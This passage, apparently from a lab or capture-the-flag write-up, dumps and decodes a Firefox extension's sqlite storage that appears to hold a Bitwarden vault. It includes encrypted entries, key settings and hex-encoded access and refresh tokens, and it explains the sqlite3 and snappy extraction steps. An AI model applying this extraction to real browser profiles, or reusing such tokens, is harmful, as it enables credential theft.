E580011B01C6D6174686C6574691E61183150D15836200016440E010101A8015811D83228001A8C0E018000315AD800F130E5D804756EB14B002E12551F4AE0000C74656C65AD6F1524016000325A60009148006D1AD01211D891800C7869616F111C1101015000335A5000713020706F7374657061792E1A520E11581E200A05200D1D015000345A500071280C666163650E0C11458D1DF85170206D657373656E6765721121ADA000350D583ED801113808736B791268151E0C0811A831000C736B7962A163006FC96F35D0119818736B7976656761113F050101D000360D7841F82E50021E781F446469736E65796D6F76696573616E7977686589E0118031981EC51451481198094019ED01E04168316008646164124D08719851C8093808706C751DB201B000370DB001682EB000113820706F6B656D6F6E2D671AD50A11A839F0052019912D8000385A580011A8086D797512CE18115011180875767661C8257601A000395A480071F8086D64731A5A130901115031E810696D6564690E0D341DA20158003A5A580071B0614C102D7961686101A6082E696C115871980120146861706F616CA5FF002E719801010160003B5A600011B80E41153D8B15B831080C73686C641EF5090150003C7A50000878696132AF0311B0513808616C69619655D0010101580E952241403E000211380C62656C6B2E680F1158510014736565646F6E759F05010158003E5AB000714018747572626F7461121C1801351158117810696E74756945CA011E09010158003F5A5800159010686F706966792111585110046D793E220016D00900400D580EE8102E0803319008656261055511501EC80A051804617475A832180004626575A0321800046361F5383618000068F530361800006EF528312005780C636F2E6ACDF10E100821C83E200000741A9D3100080DE03E200016161526601631480D60D5D21E98144220000068125715229814422000006D166B231E98144220001ADA131E981442200004747725FD1EB818321801046465229014321800046573228814321800046672228014321800046965227814361800046E001E681436180000740EB0262570321800086E6C001ED013321800087068001E901336180016361541D800412DA03E88037530086563682EC7045188313019202DF14DD800425A58005108107363687761268B0D1558D100092008706C61BDE301B000435A580000091AC01B0C7465736C2E740511B01E680A05200C6D6F746FBD06015800440D58C1C02E880322700912C130147374616E6C65659101E92A18081E703832280008636C690EA625046572A1CD09322168613000140DB01073746F636B01E70063167227B12AF160F198006DBDB501B000450DB001502EB0003160107461786163154E3960D1680920369A0A015800460D583EF81A95C81C6564696177696B691A9F1131601120011B0E380900730D2001A001F05150012045501ADE1111E82E400005640D2121903E4000123C200D400EF00801202E4000007001A40D211EE80B2E20001071756F74650D2091C0517801A010736F7572630D2100082D10514001200C766572730EFC1001831E58192E400010766F7961670D4091C01D200EFD2508617279053F0501217800470D680E400A2ED00151D814616972626E62A1F2090131783A200012CC1A010131783A2000224E1031783E200071C631783E2000893A26881C31D80DA00E0C130E9F0D3578462000006912FA3731784A2000125E103178462000006B05603178462000046E7A21003178462000C97A41E04138462000007612131AD138715015E069C7D53851581920161210D1384E20000E200F1ED01A4A20000C626F0000D5484E200021011ED01A4E200021011ED01A4A200000630160D1604A200004656316182D25204A200000670EB41BD1704A2000E59AD1784E200021E10EF00821804A2000006D01601EA0194E2000E1DA1E28194A2000006E0E822B1EB0184A200000700E52131E50184E20004101001C6D904E200001801EE8174A2000125A081EB0174E20000C760000001E78174A200012B01D1E40174E20000E9A081E10173EA00321FC01011EB8163A20000EFB1005011E78163E200016560900000EA82F25A03A200022101E1EE8153A20000066217C01011EA8153E200041BC01011E78153A200012DC1101011E40153E2000217C01011E08153A20000068615C01011E98143A2000006921DC01011E50143E20000E3C1201011EA0133E2000419C01011E68133A20001E170B00001E30133A2000220614002F4D603A200022F01E1E20123E200061BC01011EC0113A20001ADA090400001E80113E200011C01E50113A200012BC130101003456A00022301F0101C1B800480D2861702EB80651B812A82E00620EB241C9BCD1B84A2000C5BCD1B84A2000C5BCD1B84E2000C1BCD1B84E2000C1BC3E30081DA0A5181E30081E2809322000082E6E7AD1B856200008756B082D10F1F0324000006D26F00C1E580A362000C93C0101D1C05E280051E8D1C85A2800C52C0101D1D05A280055981E100D5A2800A51C01013EE0061DC885643EE0062E200081641EB0214AA80185643EE0061D4085643EE0062E200081643EE0061D20C5A01E60214A800085243EE0061D4085043EE0061D2065C43EE0061D2065843EE0061D2065643EE0062E20001E9422618000494D7041982E800331C028737461636B65786368616E2AD22C26100C31001073757065720EA5351A810C71883248000E091E0C666C6F770D24010171901E200B0EED0C086572660EEE300526719071300E90161547086E65743E90031C61736B7562756E741E8D13719015A801D0086170702A0F0D2508004A2D0801B82E08011EE0090C646F63750E3A2105953D004220001EF11C1AC80E004B0D5800085A682610656E7661742A011E91E03110247468656D65666F726573165B2B01A00EF808912024636F646563616E796F6E097A315011F00E8540046F680EED2B0999315011601C617564696F6A756E0E15300122315031701C67726170686963720EB50C01213E50012070686F746F64756E65011D05E4E9F81EE00F1433646F6365610D9D0D014178004C0D2801D02E700111D810783130686F123C35297231181D200070167037092001010158004D0D5821082E580031101C646E736F6D6174691EC32D115811B0146F70656E646E591E01A0217031E814756D6272656C3223100578004E0D78A1002E78001E7815086361670E524742A132118000151AD00F3C63616E61646173776F6E6465726C616E1E481B118811C80C6361726F0E6C2C11AA01F001A81520106564617266262A2231F83140052008706F691EA43231F811201C646F726E657970611E4A1D31F871D0006B0E902014646F6D696E692E272922980D1EF80C0C6B6E6F7422AD182A682851800C6D6961640E8B361E6B2C1E980D11682C7363686C6974746572626168757D2AD82D11B000760E1339007919F1D1D81E28110EDE49007405B50469733D57D5D8119020776F726C64736F66662AC51E4158004F2DE021882EE0011E6815047562294A31D01E781100751AA81A0101014800505A480011C812381B0C726461701A8225115051A00D2059F58D6800510D5841082EA0001EA009146E6574637570E95C010111583A200000651E180801E84150001751980475730ED1243072636F6E74726F6C70616E656C114E01D800520D80C1D82E800051081079616E6465223617D9401EC838047961163C0A117811980D3800611E980C01E001983A200000621ED80B51E871B00D4000631EEA1851E871281520086D2E610E9B0F51E84A200000670EFC0BE12801804A200012780DA1E801203AA0000065013C010151E03A200012940801011EB8093E20000E9408010151D83A2000006BF1D41EA8093E2000314081A04AA0001EF1392298093A4000006C0E740E01011E98093A2000006D1295112A78103A200022580C1E98093A200022380C1E98093A200004746A015D45ECC9603E200021BC01011E98093A200000750EB40F01011E98093E20003120010141D000530D6841902ED0029E7822716091200EA82271B5016000540D6041D02E600011980EA039086F6E2E163D4E7D309128092026E33301A821D8519809200476702E3405017800550D7801302E78009160087562692AFE3379A81E001804756299D1015000565A50001E4008287472616E7366657277697312D32A3E1801111801E4015000570D5061282EA00071D01474616B65617716D41A0134115011C0206A7573742D6561742E12260C26001F4220001A0A0F218021384220006D729150422000122E0E26C8143178246C6965666572616E646FA91E3E50041D2000612E3009D1802C746875697362657A6F7267640E0A0C3E5004147079737A6E6579500101213800582D3801702E380111981861746C61737369220F19313811201062697462750E5A271A571641202118B1C000740EF6082AA80A313811400EA425087573700EB81600690E64103138112019800E660A39387120086A697222771901D011D81108318020617661746172436F6C165B400D0126D83C16400C10436F6E6669B11312803E51C0127C17006F0E4214000012084011180867697412204101010E2040F1C00950011601012668410875746312DC501E20213698402433393A34382E3536305A11B82A484001490D0126403F011101F811780C746F6B651E5D3D0E403F11481861636365737354011E01330800A30316E8355865794A30655841694F694A4B563151694C434A686247630110F09A53557A49314E694A392E65794A75596D59694F6A45324F4445304D4441304D6A6B73496D5634634349364D5459344D5451774E7A59794F53776961584E7A496A6F696148523063446F764C327876593246736147397A644878736232647062694973496E4E3159694936496A4134596A4D334E5446694C5746685A4455744E4459784E6931694D5759334C5441784E57517A596D55334E446C6B59053C6042795A573170645730694F6E527964575573496D356862575501BD08466248016420424B6232356C63794901ACA87459576C73496A6F695A57783361573475616D39755A584E4159323979634739795958526C4C6D6830596919307058335A6C636D6C6D6157566B496A7030636E566C4C434A76636D647664015C8869493657313073496D39795A32466B62576C75496A70625853776962334A6E64584E6C362400583168626D466E5A5849694F6C74644C434A7A63335268622585C04934597A49795A6A67314F5330774E574E6B4C5451314E4441744F5445314D53316C4E54426C5A44526D4E4446684D546321B1186B5A585A70593205F8146B595759325A218C907930304D7A55324C54526A4D6D51744F44646B4E693032596A526B597A6B784E5455794D5425F13C7A593239775A53493657794A6863476B01544C765A6D5A736157356C5832466A5932567A63794A01AC04686205B8F4F20173695158427762476C6A59585270623234695858302E5367594A4D6F69426E755668464D53456C4A30504A647A633731697644384B64586A75596541434E6F69626B45695954626D6771754C67597A6A3569337559704A4B573851347A70544C6468376B6663583838785143524730554B365470515844324B694E3349765445736D676A4F444C6F7A56505F5452454C424377336866674F75696167636F65717A465146486E5A397052573233454B6A4356597449533471743645516A497A2D7A496A4F6C6E4F7A53653352424432394944344D5137377246556E545F733074354F4A70717A4162476C692D7A72747370737A305F68526C697975767079464A4A525431516C332D664638707235555F6955317473542D317568435933744F5F31626C576B3831776B6B6A5A5837354267415839596D4E6B5174475231314E6B5F67313653565953786930516B7242513043466451694B6250744F47685775633734375A644D62665759567700000000000C0000800400FFFF72656672657368546F6B656E00000000580000800400FFFF45745A4F5742584D78385746756350784E5567352D576D2D7571434B2D356835556A62303741543436686A363470317953784D4F62306775734E755F314E75363550474E545965324853335557796E6B546E327335673D3D000000001300FFFF090089301067726F75700EC40D85460901816800101EF00B22285600430EC7270D27B9681668522E1C00010104FFFFD530087970653E1E000E5044D1E81E885700432AD858A1781120086E6F461222583E2000B1B02E105901381118099809AF01180196A1581EB0450ED8520114010101F07EB0001EA00C01380956C9380140015811782E900001581120D1E001401E99472E20001C000000001300FFFF
50040300010104F1FF0106C00800FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200013538100967B4777842000000001300FFFF
380403000101C4F1FF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000
380403000101C4F1FF240000800400FFFF64616636653430372D343335362D346332642D383764362D36623464633931353532313400000000
50040300010124F1FF010000000700FFFF010EEC0300FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000000000001300FFFF
A009040300010104F1FF0106500800FFFF050000800400FFFF7468656D65000000060D101473797374656D19101477696E646F77013600000538010A101300FFFF0C1130287461746556657273696F6E011C20060000000300FFFF0F0D2038656E7669726F6E6D656E7455726C730123054800040D2008626173017F1000310000000190C868007400740070003A002F002F00700061007300730077006F0072006400740065007300740069006E006700730065007200760506082D00630524007005060061052A402E006C006F00630061006C003A003800300502090100030D80086170690911050108FFFF080D181C6964656E746974790517000019181C7765625661756C74111831480C69636F6E09DE010108FFFF0D0D48246E6F746966696361746936200000060D20106576656E74153939582C6B6579436F6E6E6563746F720152090100FF35801140106C6F63616C25421800000100FFFF160D58506E6F4175746F50726F6D707442696F6D65747269630D680128001A722800085465780DE20101013031D01473736F436F6421F20C69666965099B012000190D502473736F4F7267616E697A05F30449642147152A0901013031680C73736F534143011A011811683872656D656D6265726564456D61696C011F000021885178007621851454696D656F7515AA014000120D882E2000044163217E014009010128000A0D2820656E61626C655472612DEA010101200014322000244D696E696D697A65546F2E2A00012800113228000C436C6F733A25002D98362800105374617274364D000D28000B0D50246F70656E41744C6F676919B90170000E0D2034616C7761797353686F77446F636B013E490000180D2009D83442726F77736572496E74656772613106014800237A28002446696E6765727072696E355F0538118008646973213910466176696369FA1800000200FFFF1D0D58006251741D492056616C69646174656409AF30000200FFFF000000001300FFFF
sqlite> 
```

There is a bunch of data. In [this reddit post](https://www.reddit.com/r/firefox/comments/b5mome/how_can_i_read_the_sqlite_files_of_firefox_addons/), I can see that the databases of firefox addons use snappy, so I will do the same and successfully decrypt the data:

```bash
❯ sqlite3 -line 3647222921wleabcEoxlt-eengsairo.sqlite 'select hex(data) from object_data' | awk '{print $2}' FS=' = ' > data.hex
```

Now remove the abundant line breaks so it remains like this:

```bash
90B401040300010104F1FF01063C0800FFFF040000800400FFFF6461746101140101011800070D1818636970686572730117051800090D1820656E63727970746564051A0901013800240D209035353334663661372D313830662D343065302D626630382D656331373537363531646466000937053800020D3800690D51BE4800000E0D40306F7267616E697A6174696F6E490D4C100000FFFF080D2014666F6C646572111A39000C65646974018F20010000000200FFFF0C0D30287669657750617373776F72054E112000130D202E700018557365546F74700147152815781861766F72697465011D2E6000247265766973696F6E4461091C001B0D5868323032332D30342D31335431343A34393A34362E3335373937395A0143000031B8087479700554019800031DD0086E616D051800601150F0612E515246397649435172446548392F70374F30774447673D3D7C674E4A5078354664496639777366727937472F4161413D3D7C4B62303467756A35676E465165645645552F57785953354444504847454975322B5A58673155554E7A41733D05000045480C6E6F7465492E010108FFFF0D0D8014636F6C6C656329961120080700FF458800133D700863726525BC9A1001083830382910000B0D681864656C65746564113F0D01590018726570726F6D7025EC213011B8106C6F67696E0D2E41C831B80C75736572214C3948F05E563261684475674331376844637331445854755349513D3D7C686A6274636835666D53726E517930453544623857513D3D7C553050596C73345963356E53344A6A2F34577736324E7755484A5654574F66734E2F5934525941714F484D3D080DC800704D7400740D1058322E4970683336716D436F6D616973774C623134576C4121A7F05850494B43705A556A55616878495A4459383541336C4733494A7675774E4B37696A4C504930624F7339776F3D7C65787734656A57676A2B4A344A4D765665564E525A4141456C2B41454261397633743246734162724B35303D210F00140D80119000523AB0020901794800746D0100B40D3858322E6C6F557574576F5550377742784475586C502F35452130F09F7353395655656B5534703975656876626B376A6768706E7134386E776858534430364135554C474C7348366C61772F514B6669584D6D597979383638316349575357523750474B752F5570554F49353461785264624F6A39696456485949386A473278415A2F376A6771633D7C764E5A335A39455845372F427830473741686333763636663739736C6F464370515769514A7639684E62343D0000000012000045D0406175746F66696C6C4F6E506167654C6F618506110119F80875726945D7618851D84160012A41505168106D617463680115050108FFFF032D2808757269051239F050466C43544261586278646D7062654F6B63367356562138F05837484B53582F383041735A336B686B41504775364B4C3946727253315374324367736778706241623567343D7C41394638566D7876344E6C4E4B72426B556C6C32346D73373867413977524B4D796333635676496748536F3D058104000065909E0800D128A958250305F07E28063E600031200873656E95202138BE48009108997009940101CE5000910814706F6C69636989DBCE480000192DE871481047656E657285EA18486973746F727901A10D010160010BA118B1402E680611D22E280031281470726F766964F1B209012E280001120158D140086B6579114F052800120DA8E5DE2C6F53796D6D65747269634B651DA1015011703E080879F85050314C7174305378315232435174524E6B4D663566C170F09A65436F4B4B33724C4F4644722B686B454D6E4D5874304A56634871505843756A72475669732B4779773146723145336753632F766D6D68372F47767871355874726D38773151677753312F495051474578656F78667A5067436154354537686933613962363961365641593D7C36356464756D69375773776754305946796A5A2B7041686A7662443038612B467631357634724F345067633D0000211E690000102D082E7801004B2D2C6E0001010101200108216811081E500831A0114C010101305E50010101012001082E5000000A0DA01870726976617465A6A001000616F009F4D706322E78644D5932374D6850326A526D75444F2F526A6478773D3D7C507554436A666A363065583566513834754D59356D363274492F3467384A64383545644F2F3159654652594E3668774B537365564A3378625139314E4C314E66586C4632334F3669744673696F6F63744532557530717A7174717A4B6B304774334C786A4E6558736730774937594873695045633856496A6E41695A34614B66744F4B4C612B4E436B63464E4A4D6E4572713676414448656449487954626975327871343570477530724E587A69353962506E4F7977756E776D5A5732305471594E58614966392B73576F334876666541524A4C66347035397A505A4432533431476D6F75753065634B56427249584D336534662B67635952684371563832456A75726E416872514F74324B695851743375394E6C2F7A44384B645375477A6C56786F63394F445937504941567A56506A6142544A44656F54712F7A5836367A7A3571303931524E49384B564D676A376B4C6630334B705139506A6E6C5A63324A65594F513479576F704C5A3338317431574F476765532F693349623430656B45355344496B3333476A50744D372B63543148463332596C625949396D77454857546E34794D50354D446B5653382B456A5A75375A4F7654636937762F374E307832436F4B30342F423676596E45675A444257687035743366667A4C4575375739384334702B714B46554634786D2B7137484546706639555654584C62626D59524D565732755768306E674147436733597065596E33566B7976354E6D487867302B683250597666316F396A65496154355155526E723257624A62647375735839326C33774A3166513935612F2B7A524F4261635A316D4E4C33517A6F762F626C514A6F6341513830326D4949456F516530586E68463344426E5937506E6F565A5431626778326B614456464C6C4D41436F644D76466134354E7A39314E4234444E656A7A71304D797534564D584C773073663057644E5A3445456B4254556E56445153662F35737A61726D5734486745616B58394941737A50554D59474A4B617151396266355069736170396A5A4F654E4632304263707A78594E5654455A655137574F446D534F346673746248443562734A725238735063553231656B654E466A49686C39433732434357446576474F464974774C4A7035356458312F2F705844646752495A782F442B7A61723558582B41763341674F45794642363555644E6E51655049375546643433612B6B6D4144346E3864584A6B616C3247626842657A386A393851344E303847646A474D39636162586745566E69676550726733376B3859726842434C6D536A4F7A343048685954366B796E316773344E4A55306F6644366534446C39516C2F72373949427163654D756C6E3263554C396B42596852535253387646366975625675566831616D434E4350316B49756E6E2B325A57364F50576C446A56637A656273657869576731746743656B56784C45707345526F2B6830647133397537474C394876306C346E37374964524D73396C42777134446A6A683676524F2B3465714C774C4C787235445833516239794D2F62656F6E6E4D56454F7672384370706F7259727555794D6D776C394F594342704C7768635069503257743475455548766B526E5A7659552B784B74513249483836696A34756B47514E7550694A457A7676375A32336176335A77723169774C565553773843545950646A4E77387975714D455A6B4D4C776E4955324A58553533477258626F464E4755776A6C4551476A376C31506F346847307535564672485141697A55304D61564378444939584A4842566973594475535453477354492B347337347263667858666D64656B6E316A5362586F4378306859332F55375A6779547636704964463155354F4556443475444C314B7178326138316E4B36514477762F636E78544352564B32616F467557716774353762536333424D2F4756777550736F4D746F647A335776714F656C4D504D596B766A5144306D4450314174362F56664D6652304E504E306576746241584F5264787A4F576866492F5444754F506A32534C583649386A6137646A5279307953693173633953547462534365536A4D4D44396F682F496374416A375478355838556635714A594271446A585968396F43595065596B4A4C64356B376B635A6F756C7674646E507059584E647A4666527477517764326173324353494B772B464753506A424B7A364D644B6D684B5A494E4E543076596A67675238355537364862335063777273654E48612B4F4268595034797167634B515A35413D7C374A67516469624278627A3430784E544A4A4857653456384C4E7239457A7A3671452F52617A346F4F676F3D00000000000000001300FFFF0F0000800400FFFF63727970746F4D61737465724B657900E1280EF00FF1500C7075626C3ABF080400012A780E1EC00A0470720EE70B12330FE5700006ED600E000E0E2E101E90109830386233373531622D616164352D343631362D623166372D30313564336265373439646200000022A00F0E3C0E01941E980A20456C77696E204A6F6E164B0A00001EF80A1C656D61696C0000001E280A00650128042E6A01283040636F72706F726174652E6874055D04000022980D486861735072656D69756D506572736F6E616C6C12AA090E880C0E68101E400A106B646649741A720A0EF10908C0270912A00C3128146B64664D656D36880A21481E5811346B6466506172616C6C656C69736D0182010100FF35400C6B6466541A8B1005583158206B657948617368002C2D50C037344537316F505A4939764E6E6F45534E6B754C6C6144546C6B317A412F6348356C35584E4F4C4F6334773D000000000D0D3825201456657269666912741211E01EA8093C757365734B6579436F6E6E6563746F72019E2100001C0D403C636F6E766572744163636F756E74546F3E2C000901262810206C61737453796E63180D402E901130353A34303A32372E3533335A1A0D2039881046726F6D4F2A8612095A01012E78021E580C1873657474696E6721934578000F0D5034656E7669726F6E6D656E7455726C051F052000040D2008626173455800310D1018687474703A2F2F1E5F0C0874657305571465727665722D5941246C6F63616C3A383030300191000021AC16100A04617016800E09013908186964656E7469744554411051B00869636F4548090126E811186E6F746966696312DA0C09B6010100FF7550106576656E7415191968187765625661756C12981101681E300B006B3AD40109014638122070696E50726F7465632A93140E380B51E03EA80C008865A4F0C2FFFF32002E004400580047006400530061004E00380074004C0071003500740053005900580031004A0030005A00440067003D003D007C003400750058004C006D0052004E0070002F0064004A0067004500340031004D0059005600780071002B006E00760064006100750069006E007500300059004B00320065004B006F004D007600410045006D0076004A00380041004A003900440062006500780065007700720067006800580077006C00420076003900700052007C005500630042007A006905A4F0497500430069004A007000700035004D004F0052004200670048007600520032006D00560067007800330069006C007000510068004E0074007A004E004A0041007A00660034004D003D0021600E680C1E080E007621952054696D656F757441630EC01301222680140C6C6F636B011231B02E3000011804FFFF0EE410265015007031A50050226F1325F05E100300114DA0286571756976616C656E74440E0113555C0859000032701100023A100091C034616D65726974726164652E636F6DC10441FC00FF95400474643E220016080E81680EC81100043A580011981462616E6B6F66053C046361095B0501113811D808626F66051F01A001501118086D626E05180E981701181ED80D1475736563666F1D510D90114001302E6812113814737072696E7419381188D1080920087063730D2311501140146E657874656C0D1D0D014110017001A001082E7800D1D814796F757475622D5D00003960115810676F6F676C191F157871A00067E10036770005782178017801A82E78001138086170702E570015F011781469636C6F756436590001D000054D003ED00051302077656C6C73666172672D8431481E18080477660954019801A000164DA819381861647669736F7231692DC000065A780031A01C6D796D657272696C310C3E7800006D0D191178D1300D3608656467396501E800070D7001F02E400151C0046163E511106F6E6C696E193A394851A80C6369746901F2117871F001186104011C01E42150211011D001200C63617264310731D09160012001404281002D3000080DC001C82EC0001598046E6545EE312831F80118047476119659701E980808636F6D051D11B011D018646F776E6C6F61553211B01170086E657705CB215001E81170147365617263680553050131E811200475702E5600090121A000090DE001682EE00031201C62616E616E61726516C80A196011F011D008676170051D31A07198186F6C646E617679051C010111F031A01C70697065726C696D2EFC010198000A0D98000E3AF80431080C62696E6701551188117008686F7432CA0311901138086C6976056B3E88001C6D6963726F736F6625CDC960256011E0086D736E016F0E300B051831B00EF10818706F72742E6E65C570317811901077696E646F29B301FF0000414821B81EC01B15783A8102517831C0106F6666696305BA0547000031B8314809200833363505A6040000314031C815680EED151D48000B2D6831200C78626F780143000C0D1895E8047A752E37000E180B05C80010917809E832270021C811603E600211580875613291E3050131D03178047561897131C8311010756E6974657526018C010400FF41301238190920087769668536055B059011D801502EF00231D0006F0EA60B1DEB119011B00C7961686FAD93150101E8000D0D803E580031A01C7A6F6E65616C617269F699E011780120086C616265DC11590158610041303E580031080C706179702D23050111B0B1600920002D3E1F0405010160000F5AB80051100861766F45F9115811B00C796F7572111C054DAD3000100D5021F82E60017110106469617065DD951158117004736F894901F001F8510804776165EF9540113008796F79258F4160013031702062656175747962617241CD000012E80E052011380863617312F80871B0D1C82461667465727363686F6F497871B011380076CDA771A0311014626F6F6B776F35DF75A01138086C6F6FC5A47198F1E801500C6D61726BC946214649A800112D4821082E480171702831383030636F6E746163744534314811C83A1F00055921F000120D5800133A580551500C616D617A29F2053335A031581920042E620E010E01A0217871200D200061011C0101B1683A2000046361011DBD6831480D400C636F2E7512D80BD1E84A80000C61750000B5704A200000620E850F31C04A2000086D78000ED40E49184A200000740140B1683AC000006411E031D03A20001A5E110000B5603A20000066015C010191903A2000229D0C91583E2000C56D0400000E78224E8001006E0ECC11010171E03A40000070112071B03A2000007331A051883E2000310051503E20000067017D0D0141784170412841102ED00271E00063C97755702E1800E15B516851E024636F78627573696E657345FF056A016800142DD001302E6800F57018796E6F72746F6E1A780A8D1E59E871080926151F0501016000155A600091E00C766572692E410371983E200001D41101015800167A58001472616B757465199111583128046275266409015000175A500071681873697269757378D18F15503100092046000100180D58A1702E60011E980C0065A556465000106F7269676919BF35D071781C706C6179346672651E9B08412841301E002234746962657269756D616C6C69616E2E0A09A93000195A980011601C33377369676E616C11D3314031100ED0120863616D16C50A2AB00BB1A81120046871291411A011201C6869676872697365112001012188001A0D9801302E3001B1C824737465616D706F77657216CE0811981EB80905200C636F6D6D0ED10839E33540118005280C67616D6511E12D18001B0D803E1003D1981C63686172742E696F117851A805180069E55B014B050101D0001C5A5000719818676F746F6D65650EFD132529115811F01463697472697836ED0A0158001D5A5800119014676F676F6169F1CE59601158012018696E666C69676875D50158001E5A580091B00C6D797371E9EA090111B071080C6F72616332E10F2D58001F5A580051500C646973630E4C0A25054AB00011200E9C0E112401B000205A580071E8186463752E6F726715A851000C6463752D2D56011F0501015000210D503E80021138346865616C7468636172652E676F7639585180346375696461646F646573616C756409240101415061A0119808636D73151D017800220D7801282EF80231780C706570632E5E02317822B80A1C6570636F686F6C640E9D1631210D01016000235A600071F02063656E7475727932310D3C116031A00432312D2E128E130901015800240D583E3001518814636F6D636173556315583E2000B1E0210021281120107866696E692EC9034D5000250D7801302E3001D1B82C637269636B6574776972656C2EF40611D871800861696F42240001D800265A60003130106D616E64740E09112D11115831E0086D74620D1AA97000275A500011E80C64726F701A4B0E01E315505178086765743E230005A800285A580031B818736E617066697322EA1011A8117819201EC208095800290D583EB806113814616C69626162CDBD7DB011B018616C6965787072357B21A821D8912810616C697975DDE041400120F118006E0EE10B1ABC162190002A0D9001482EF00131C8E11004737412C718257811E81E501A2C736F6E79656E74657274616912A619146E6574776F7231BF05010168002B0D680E480B2E6800B138246D65726361646F6C697616DF0F116851783E200016560B000035004248000062094831004248000D20042E6116020B2190212862280012A60B090101D0002C0DD03E380131C8147A656E646573390711D091780C7A6F706922F5080D010158002D5A580051780E88292E5900115871400C74696E6B254B25AE09010158002E0D580E880C2E80011138107261696C6E29E700720ED00C3E58001D2012740C01F8213051280120002D0D4181CB31784A60000067217231704A200000750E171B4128016051F810747275636B0D6001811E300F31F8187472617669616E327A0801F8002F0DF801B02EF80031881C777063752E636F6F16AE2E46200401203EA20501580E381C01A001E82E580011B01C6D6174686C6574691E61183150D15836200016440E010101A8015811D83228001A8C0E018000315AD800F130E5D804756EB14B002E12551F4AE0000C74656C65AD6F1524016000325A60009148006D1AD01211D891800C7869616F111C1101015000335A5000713020706F7374657061792E1A520E11581E200A05200D1D015000345A500071280C666163650E0C11458D1DF85170206D657373656E6765721121ADA000350D583ED801113808736B791268151E0C0811A831000C736B7962A163006FC96F35D0119818736B7976656761113F050101D000360D7841F82E50021E781F446469736E65796D6F76696573616E7977686589E0118031981EC51451481198094019ED01E04168316008646164124D08719851C8093808706C751DB201B000370DB001682EB000113820706F6B656D6F6E2D671AD50A11A839F0052019912D8000385A580011A8086D797512CE18115011180875767661C8257601A000395A480071F8086D64731A5A130901115031E810696D6564690E0D341DA20158003A5A580071B0614C102D7961686101A6082E696C115871980120146861706F616CA5FF002E719801010160003B5A600011B80E41153D8B15B831080C73686C641EF5090150003C7A50000878696132AF0311B0513808616C69619655D0010101580E952241403E000211380C62656C6B2E680F1158510014736565646F6E759F05010158003E5AB000714018747572626F7461121C1801351158117810696E74756945CA011E09010158003F5A5800159010686F706966792111585110046D793E220016D00900400D580EE8102E0803319008656261055511501EC80A051804617475A832180004626575A0321800046361F5383618000068F530361800006EF528312005780C636F2E6ACDF10E100821C83E200000741A9D3100080DE03E200016161526601631480D60D5D21E98144220000068125715229814422000006D166B231E98144220001ADA131E981442200004747725FD1EB818321801046465229014321800046573228814321800046672228014321800046965227814361800046E001E681436180000740EB0262570321800086E6C001ED013321800087068001E901336180016361541D800412DA03E88037530086563682EC7045188313019202DF14DD800425A58005108107363687761268B0D1558D100092008706C61BDE301B000435A580000091AC01B0C7465736C2E740511B01E680A05200C6D6F746FBD06015800440D58C1C02E880322700912C130147374616E6C65659101E92A18081E703832280008636C690EA625046572A1CD09322168613000140DB01073746F636B01E70063167227B12AF160F198006DBDB501B000450DB001502EB0003160107461786163154E3960D1680920369A0A015800460D583EF81A95C81C6564696177696B691A9F1131601120011B0E380900730D2001A001F05150012045501ADE1111E82E400005640D2121903E4000123C200D400EF00801202E4000007001A40D211EE80B2E20001071756F74650D2091C0517801A010736F7572630D2100082D10514001200C766572730EFC1001831E58192E400010766F7961670D4091C01D200EFD2508617279053F0501217800470D680E400A2ED00151D814616972626E62A1F2090131783A200012CC1A010131783A2000224E1031783E200071C631783E2000893A26881C31D80DA00E0C130E9F0D3578462000006912FA3731784A2000125E103178462000006B05603178462000046E7A21003178462000C97A41E04138462000007612131AD138715015E069C7D53851581920161210D1384E20000E200F1ED01A4A20000C626F0000D5484E200021011ED01A4E200021011ED01A4A200000630160D1604A200004656316182D25204A200000670EB41BD1704A2000E59AD1784E200021E10EF00821804A2000006D01601EA0194E2000E1DA1E28194A2000006E0E822B1EB0184A200000700E52131E50184E20004101001C6D904E200001801EE8174A2000125A081EB0174E20000C760000001E78174A200012B01D1E40174E20000E9A081E10173EA00321FC01011EB8163A20000EFB1005011E78163E200016560900000EA82F25A03A200022101E1EE8153A20000066217C01011EA8153E200041BC01011E78153A200012DC1101011E40153E2000217C01011E08153A20000068615C01011E98143A2000006921DC01011E50143E20000E3C1201011EA0133E2000419C01011E68133A20001E170B00001E30133A2000220614002F4D603A200022F01E1E20123E200061BC01011EC0113A20001ADA090400001E80113E200011C01E50113A200012BC130101003456A00022301F0101C1B800480D2861702EB80651B812A82E00620EB241C9BCD1B84A2000C5BCD1B84A2000C5BCD1B84E2000C1BCD1B84E2000C1BC3E30081DA0A5181E30081E2809322000082E6E7AD1B856200008756B082D10F1F0324000006D26F00C1E580A362000C93C0101D1C05E280051E8D1C85A2800C52C0101D1D05A280055981E100D5A2800A51C01013EE0061DC885643EE0062E200081641EB0214AA80185643EE0061D4085643EE0062E200081643EE0061D20C5A01E60214A800085243EE0061D4085043EE0061D2065C43EE0061D2065843EE0061D2065643EE0062E20001E9422618000494D7041982E800331C028737461636B65786368616E2AD22C26100C31001073757065720EA5351A810C71883248000E091E0C666C6F770D24010171901E200B0EED0C086572660EEE300526719071300E90161547086E65743E90031C61736B7562756E741E8D13719015A801D0086170702A0F0D2508004A2D0801B82E08011EE0090C646F63750E3A2105953D004220001EF11C1AC80E004B0D5800085A682610656E7661742A011E91E03110247468656D65666F726573165B2B01A00EF808912024636F646563616E796F6E097A315011F00E8540046F680EED2B0999315011601C617564696F6A756E0E15300122315031701C67726170686963720EB50C01213E50012070686F746F64756E65011D05E4E9F81EE00F1433646F6365610D9D0D014178004C0D2801D02E700111D810783130686F123C35297231181D200070167037092001010158004D0D5821082E580031101C646E736F6D6174691EC32D115811B0146F70656E646E591E01A0217031E814756D6272656C3223100578004E0D78A1002E78001E7815086361670E524742A132118000151AD00F3C63616E61646173776F6E6465726C616E1E481B118811C80C6361726F0E6C2C11AA01F001A81520106564617266262A2231F83140052008706F691EA43231F811201C646F726E657970611E4A1D31F871D0006B0E902014646F6D696E692E272922980D1EF80C0C6B6E6F7422AD182A682851800C6D6961640E8B361E6B2C1E980D11682C7363686C6974746572626168757D2AD82D11B000760E1339007919F1D1D81E28110EDE49007405B50469733D57D5D8119020776F726C64736F66662AC51E4158004F2DE021882EE0011E6815047562294A31D01E781100751AA81A0101014800505A480011C812381B0C726461701A8225115051A00D2059F58D6800510D5841082EA0001EA009146E6574637570E95C010111583A200000651E180801E84150001751980475730ED1243072636F6E74726F6C70616E656C114E01D800520D80C1D82E80005108107961